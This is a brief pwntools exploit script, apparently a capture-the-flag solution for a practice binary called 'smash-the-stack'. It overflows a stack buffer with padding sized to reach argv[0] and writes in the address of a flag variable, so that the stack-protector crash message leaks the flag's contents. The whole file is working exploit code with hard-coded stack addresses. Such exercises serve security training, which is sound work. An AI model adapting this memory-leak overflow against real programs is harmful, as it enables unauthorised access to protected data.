from pwn import*
context.log_level="debug"

p = process('./smash-the-stack')

argv_add = 0xffffd0b4
buf_add = 0xffffcff8
flag = 0x804a060
offset = argv_add - buf_add

payload = 'a'*offset+"\x60\xa0\x04\x08"
p.send(payload)
